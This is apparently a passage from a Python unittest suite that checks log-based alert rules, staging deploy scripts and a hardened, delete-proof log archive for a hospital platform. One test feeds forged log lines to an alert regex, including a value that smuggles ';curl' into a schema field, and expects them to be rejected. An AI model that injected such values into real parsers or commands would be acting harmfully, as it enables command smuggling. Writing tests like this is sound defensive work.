        for forged in ('10.0.0.9 - - [x] "GET /ihr-db-role: gated schema=h_ab12cd34ef reason=controls" 404 179',
                       "ihr-db-role: gated schema=public reason=controls",
                       "ihr-db-role: gated schema=h_ab12cd34ef reason=forged",
                       "ihr-db-role: gated schema=h_ab12cd34ef reason=controls (and more)",
                       "ihr-db-role: gated schema=h_ab12cd34ef;curl reason=controls"):
            self.assertIsNone(line.search(forged), forged)
        roles = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "db_roles.py").read_text()
        self.assertIn('return f"{GATED_PREFIX} schema={schema} reason={reason}"', roles)
        self.assertIn('GATED_PREFIX = "ihr-db-role: gated"', roles)
        tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
        self.assertIn("for line in db_roles.gated_lines():", tasks)

    def test_login_failed_line_is_postgres_own(self):
        """Known limit 1 (P1-T19a): a role that changed its own password shows as Postgres
        refusing it. Only the whole message, for our roles."""
        [rule] = [r for _, r in self.rules() if r["alert"] == "DatabaseRoleLoginFailed"]
        self.assertEqual(rule["labels"]["severity"], "critical")
        line = re.compile(LOGIN_FAILED)
        found = line.search('2026-11-13 04:30:00.123 UTC [57] FATAL:  password authentication failed for user "ihr_app"')
        self.assertEqual(found["role"], "ihr_app")
        for other in ('2026-11-13 04:30:00.123 UTC [57] FATAL:  password authentication failed for user "postgres"',
                      'FATAL:  password authentication failed for user "ihr_app" (and more)',
                      'FATAL:  password authentication failed for user "ihr_apps"'):
            self.assertIsNone(line.search(other), other)

    def test_fleet_runs_reach_the_alert(self):
        """S3 (P1-T18a review): an operator's fleet run and its --resume run in a logged
        container the rule reads ("migrate"), never the unlogged admin one; the worker's
        per-minute report writes the same whole line, unprefixed, from "celery-worker"."""
        [case] = re.findall(r"^  fleet\)(.*?);;$", STAGING_SH, re.M | re.S)
        self.assertIn("run --rm --no-deps -T migrate python manage.py ihr_fleet_run", case)
        self.assertNotIn("admin", case)
        # only `fleet window` (no "ihr-fleet:" line) runs as the running backend's build (P1-T18b
        # review D10): in it before the move of the roles, after it (P1-T19b: the backend runs as
        # the app role) in a one-off of its image in the same logged migrate container. Before
        # the move also release and hold (review C1: ihr_owner does not exist yet, so the
        # migrate one-off cannot log in), in the running backend as release's own hold is
        self.assertEqual(case.count("ihr_fleet_run"), 2)
        # ...and, after the move, while a release's migrations have not started and an outgoing
        # build serves (its stage 1: the second fixer of P1-T20b): in a one-off of its image in
        # the logged migrate container, as above
        self.assertIn('&& { [[ "${2:-}" == window ]] || { [[ "${2:-}" =~ ^(release|hold)$ ]] '
                      '&& { rel_db_single || rel_outgoing_unmigrated; }; }; }; then', case)
        unmigrated = STAGING_SH.split("rel_outgoing_unmigrated() {", 1)[1].split("\n}\n", 1)[0]
        self.assertIn('"$(attempt_get migrations)" != started', unmigrated)
        self.assertIn('"$(running_backend_id 2>/dev/null)" != "$(image_id "$(env_get IHR_BACKEND_IMAGE)")"', unmigrated)
        self.assertIn('old_manage ihr_fleet_run "${@:2}"', case)
        self.assertIn('"$(db_roles_state 2>/dev/null || true)" == single', STAGING_SH.split("rel_db_single() {", 1)[1][:200])
        old = STAGING_SH.split("old_manage() {", 1)[1].split("\n}\n", 1)[0]
        self.assertIn('compose run --rm --no-deps -T migrate python manage.py "$@"', old)
        self.assertIn("compose exec -T backend python manage.py", old)
        self.assertNotIn("admin", old.split("\n  local", 1)[1])
        tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
        self.assertIn('os.write(2, f"{line}\\n".encode())', tasks)
        self.assertIn('fleet.log_line(slug, "held")', tasks)
        compose = load(ROOT / "deploy" / "staging" / "compose.yaml")
        self.assertIn("celery-worker", compose["services"])
        services = compose["services"]
        self.assertEqual(services["admin"]["logging"]["driver"], "none")
        self.assertNotEqual(services["migrate"]["logging"]["driver"], "none")

    def test_holds_and_routing(self):
        """The hold before mailing is part of each alert's meaning (README table); the per-address
        alerts are mailed at any hour (owner, Q-O9)."""
        holds = {r["alert"]: r.get("for") for _, r in self.rules()}
        self.assertEqual(holds, {"SignInLockoutsFromAddress": None, "SignInLockoutStorm": None,
                                 "FailedSignInsFromAddress": None, "RateLimitedAddress": "5m",
                                 "PackApplyFailed": None, "HospitalNotServed": None,
                                 "ReleaseWindowOverrun": None, "DatabaseRoleRefused": None,
                                 "DatabaseSchemaGated": None, "DatabaseRoleLoginFailed": None,
                                 "BatchRequestRefused": None, "AuditHospitalCheckFailed": None,
                                 "AuditHospitalSealLate": None, "AuditEventRecorded": None,
                                 "DumpHospitalFailed": None, "DumpHospitalHeld": None})
        anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
        self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
        cfg = func("monitoring_config")
        route = cfg.index("matchers: ['notify=\"anytime\"']")
        self.assertLess(route, cfg.index("matchers: ['severity=\"warning\"']"))
        self.assertNotIn("active_time_intervals", cfg[route:route + 120])
        # lock-outs count accounts, not events; failed sign-ins count credential errors only
        exprs = {r["alert"]: r["expr"] for _, r in self.rules()}
        self.assertIn("count_uniq(kc_user)", exprs["SignInLockoutsFromAddress"])
        self.assertIn("count_uniq(kc_user)", exprs["SignInLockoutStorm"])
        self.assertIn("kc_error:in(invalid_user_credentials, user_not_found, invalid_user, user_temporarily_disabled, user_disabled)",
                      exprs["FailedSignInsFromAddress"])

    def test_vmalert_wiring(self):
        cmd = SVC["vmalert"]["command"]
        self.assertIn("-rule.defaultRuleType=vlogs", cmd)
        self.assertIn("-datasource.url=http://victorialogs:9428", cmd)
        self.assertIn("-notifier.url=http://${IHR_ALERTMANAGER_IP:-10.203.0.20}:9093", cmd)
        self.assertIn("../logs/alerts:/etc/vmalert/rules:ro", SVC["vmalert"]["volumes"])


class Wiring(unittest.TestCase):
    def test_staging_sh(self):
        self.assertIn('files+=(-f "$DIR/compose.monitoring.yaml" -f "$DIR/compose.logs.yaml")', func("compose"))
        self.assertIn("logs_smoke", func("monitoring_smoke"))
        up = func("monitoring_up")
        for s in LONG_RUNNING:
            self.assertIn(s, up)
        self.assertIn("logs_cap_metric", func("monitoring_textfile"))

    def test_deploy_ships_the_settings(self):
        self.assertRegex(DEPLOY_SH, r"git ls-files -z deploy/staging deploy/s3 deploy/monitoring deploy/logs ")

    def test_local_proof_overlay_covers_the_core_services(self):
        local = set(ALL_COMPOSE["compose.local.yaml"]["services"])
        journal = ALL_COMPOSE["compose.local-journal.yaml"]["services"]
        self.assertEqual(set(journal), local)
        for name, s in journal.items():
            self.assertEqual(s["logging"]["driver"], "journald", name)

    def test_backend_loggers_stay_on(self):
        text = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "settings" / "deployment.py").read_text()
        self.assertIn('LOGGING["disable_existing_loggers"] = False', text)


class Archive(unittest.TestCase):
    """The daily locked archive (P1-T9c, ADR-014)."""

    ARC = load(STAGING / "compose.logs-archive.yaml")["services"]["logs-archive"]

    def test_archiver_hardened_and_isolated(self):
        a = self.ARC
        self.assertTrue(a["read_only"])
        self.assertEqual(a["cap_drop"], ["ALL"])
        self.assertIn("no-new-privileges:true", a["security_opt"])
        self.assertEqual(a["user"], "${IHR_SECRETS_UID:?}:${IHR_SECRETS_GID:?}")
        self.assertNotIn("ports", a)
        # the store and its own way out; the local stand-in only in a proof
        self.assertEqual(a["networks"], ["logs", "archiveout"])
        local = load(STAGING / "compose.logs-archive.local.yaml")["services"]["logs-archive"]
        self.assertEqual(local["networks"], ["logs", "archiveout", "internal"])
        self.assertEqual(members("archiveout"), {("compose.logs-archive.yaml", "logs-archive"),
                                                 ("compose.logs-archive.local.yaml", "logs-archive")})
        self.assertEqual(a["env_file"], ["secrets/logs-archive.env"])
        self.assertIn("./secrets/logs-http-password:/run/ihr-logs/http-password:ro", a["volumes"])
        self.assertIn("../logs/archive:/opt/ihr-archive:ro", a["volumes"])

    def test_writer_key_can_never_delete(self):
        """The archive's key on the stand-in: add and read under logs/, nothing else (the owner's
        machine erases, Q-O12)."""
        import json as _json

        tpl = _json.loads((ROOT / "deploy" / "s3" / "s3.template.json").read_text())
        (ident,) = [i for i in tpl["identities"] if i["name"] == "ihr-log-archive"]
        self.assertNotIn("actions", ident)
        (pol,) = [p for p in tpl["policies"] if p["name"] == "ihr-log-archive"]
        actions = {a for st in _json.loads(pol["content"])["Statement"] for a in st["Action"]}
        self.assertFalse({a for a in actions if "Delete" in a or "Retention" in a or "Lock" in a and a.startswith("s3:Put")})
        self.assertLessEqual(actions, {"s3:PutObject", "s3:GetObject", "s3:GetObjectVersion", "s3:ListBucket",
                                       "s3:GetBucketObjectLockConfiguration", "s3:GetBucketVersioning"})
        # the server never runs the erasure: it is a one-off with the admin key from stdin
        self.assertIn("expire.py", func("logs_archive_expire"))
        self.assertNotIn("expire", " ".join(self.ARC["entrypoint"]))
        self.assertNotIn("ADMIN", (STAGING / "compose.logs-archive.yaml").read_text())

    def test_archive_bucket_locked_like_e2e(self):
        up = func("s3_up")
        self.assertIn("--log-archive", up)
        text = (ROOT / "deploy" / "s3" / "setup_buckets.py").read_text()
        self.assertIn('p.add_argument("--log-archive-mode", choices=sorted(STRENGTH), default="GOVERNANCE")', text)
        self.assertIn('p.add_argument("--log-archive-days", type=int, default=400)', text)

    def test_archive_key_and_encryption_key_handling(self):
        init = func("logs_archive_init")
        self.assertIn("write_secret logs-archive.env", init)
        self.assertIn('read -rsp "Secret key: " secret', init)
        self.assertIn("IFS= read -r key", init)
        self.assertIn("password manager", init)
        self.assertRegex(init, r"\^\[A-Za-z0-9_-\]\{43\}=\$")
        # erasure gets the bucket's address only, never the writer's or the encryption key
        exp = func("logs_archive_expire")
        self.assertIn("IHR_LOGS_ARCHIVE_ENDPOINT|IHR_LOGS_ARCHIVE_REGION|IHR_LOGS_ARCHIVE_BUCKET|IHR_LOGS_ARCHIVE_URI_STYLE", exp)

    def test_wiring(self):
        c = func("compose")
        self.assertIn('s3) files+=(-f "$DIR/compose.logs-archive.yaml") ;;', c)
        self.assertIn("logs-archive", func("monitoring_up"))
        self.assertIn("archive_exec check", func("logs_smoke"))
        self.assertIn("logs_archive_init --local", STAGING_SH)
        prom = load(ROOT / "deploy" / "monitoring" / "prometheus" / "prometheus.yml")
        jobs = {j["job_name"]: j for j in prom["scrape_configs"]}
        self.assertEqual(jobs["logs-archive"]["file_sd_configs"][0]["files"], ["/etc/prometheus/targets/logs-archive.json"])
        rules = (ROOT / "deploy" / "monitoring" / "prometheus" / "rules" / "logs.yml").read_text()
        for name in ("LogArchiveBehind", "LogArchiveFailing", "LogArchiveNotAuthentic", "LogArchiveErasureOverdue"):
            self.assertIn("alert: " + name, rules)


if __name__ == "__main__":
    unittest.main()
